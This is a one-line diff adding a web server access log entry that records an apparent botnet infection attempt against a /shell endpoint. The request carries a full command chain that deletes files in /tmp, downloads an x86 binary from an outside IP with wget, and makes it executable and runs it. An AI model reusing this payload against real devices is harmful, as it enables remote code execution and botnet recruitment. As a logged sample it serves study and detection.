@@ -1,0 +1,1 @@
+77.235.145.202 - - [25/Jun/2020:03:10:14 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86+w00dy.jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
